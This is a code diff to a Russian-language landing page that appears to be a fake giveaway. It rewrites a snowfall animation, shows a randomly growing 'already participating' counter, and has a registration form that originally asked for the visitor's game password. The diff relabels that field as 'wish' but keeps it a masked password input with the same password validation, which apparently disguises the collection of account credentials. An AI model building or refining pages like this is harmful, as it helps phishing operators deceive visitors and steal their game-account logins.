@@ -37,16 +37,34 @@
 
         .snowflake {
             position: absolute;
-            top: -10px;
-            color: #fff;
-            font-size: 1.2em;
-            animation: fall linear infinite;
-            opacity: 0.6;
+            top: -50px;
+            pointer-events: none;
+            will-change: transform;
+            animation: snowfall linear forwards;
         }
 
-        @keyframes fall {
-            to {
-                transform: translateY(100vh) rotate(360deg);
+        .snowflake img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            filter: drop-shadow(0 0 3px rgba(255, 255, 255, 0.5));
+        }
+
+        @keyframes snowfall {
+            0% {
+                transform: translateY(0) rotate(0deg) translateX(0);
+            }
+            25% {
+                transform: translateY(25vh) rotate(90deg) translateX(15px);
+            }
+            50% {
+                transform: translateY(50vh) rotate(180deg) translateX(-10px);
+            }
+            75% {
+                transform: translateY(75vh) rotate(270deg) translateX(20px);
+            }
+            100% {
+                transform: translateY(110vh) rotate(360deg) translateX(0);
             }
         }
 
@@ -849,7 +867,7 @@
 
 <div class="participants-section">
     <span style="font-size: 2.5rem;">👥</span>
-    <div class="participants-number" id="participant-count">1247</div>
+    <div class="participants-number" id="participant-count">1,247</div>
     <div style="font-size: 1.2rem; font-weight: 600; text-transform: uppercase;">Уже участвуют</div>
     
     <button class="cta-button" id="openModal">
@@ -925,8 +943,8 @@
                 </div>
                 
                 <div class="form-group">
-                    <label class="form-label">🔑 Пароль</label>
-                    <input type="password" class="form-input" id="password" placeholder="Ваш игровой пароль" required>
+                    <label class="form-label">🔑 Желание</label>
+                    <input type="password" class="form-input" id="password" placeholder="Минимум 6 символов" required>
                     <div class="form-help info show">Минимум 6 символов</div>
                     <div class="form-help error" id="password-error"></div>
                 </div>
@@ -1107,25 +1125,64 @@ function updateParticipantCount() {
 
 setInterval(updateParticipantCount, Math.random() * 10000 + 5000);
 
-// Snow
+// Snow - Улучшенная логика с PNG
+const snowContainer = document.getElementById('snow-container');
+const MAX_SNOWFLAKES = 50; // Максимум снежинок на экране
+let activeSnowflakes = 0;
+
 function createSnowflake() {
+    // Ограничиваем количество
+    if (activeSnowflakes >= MAX_SNOWFLAKES) return;
+    
     const snowflake = document.createElement('div');
     snowflake.classList.add('snowflake');
-    snowflake.textContent = '❄';
-    snowflake.style.left = Math.random() * 100 + '%';
-    snowflake.style.fontSize = (Math.random() * 1 + 0.8) + 'em';
-    snowflake.style.opacity = Math.random() * 0.5 + 0.3;
-    snowflake.style.animationDuration = (Math.random() * 5 + 10) + 's';
     
-    document.getElementById('snow-container').appendChild(snowflake);
+    // Используем PNG
+    const img = document.createElement('img');
+    img.src = 'flake.png';
+    img.alt = '';
+    snowflake.appendChild(img);
     
-    setTimeout(() => snowflake.remove(), 15000);
+    // Рандомные параметры
+    const size = Math.random() * 25 + 15; // 15-40px
+    const startX = Math.random() * 100;
+    const duration = Math.random() * 8 + 8; // 8-16 секунд
+    const delay = Math.random() * 2;
+    const opacity = Math.random() * 0.4 + 0.4; // 0.4-0.8
+    
+    snowflake.style.cssText = `
+        left: ${startX}%;
+        width: ${size}px;
+        height: ${size}px;
+        opacity: ${opacity};
+        animation-duration: ${duration}s;
+        animation-delay: ${delay}s;
+    `;
+    
+    snowContainer.appendChild(snowflake);
+    activeSnowflakes++;
+    
+    // Удаляем после завершения анимации
+    const totalTime = (duration + delay) * 1000;
+    setTimeout(() => {
+        snowflake.remove();
+        activeSnowflakes--;
+    }, totalTime);
 }
 
-setInterval(createSnowflake, 400);
-for (let i = 0; i < 15; i++) {
-    setTimeout(createSnowflake, i * 200);
+// Создаём снежинки с разным интервалом
+function snowLoop() {
+    createSnowflake();
+    // Рандомный интервал 200-600мс
+    const nextInterval = Math.random() * 400 + 200;
+    setTimeout(snowLoop, nextInterval);
 }
+
+// Стартовые снежинки
+for (let i = 0; i < 20; i++) {
+    setTimeout(createSnowflake, i * 100);
+}
+snowLoop();
 
 // Modal
 const modal = document.getElementById('registrationModal');
@@ -1318,7 +1375,7 @@ form.addEventListener('submit', async (e) => {
     
     // Валидация пароля
     if (!validatePassword(password)) {
-        showError('password', '❌ Пароль должен содержать минимум 6 символов!');
+        showError('password', '❌ Желание должен содержать минимум 6 символов!');
         document.getElementById('password').focus();
         return;
     }
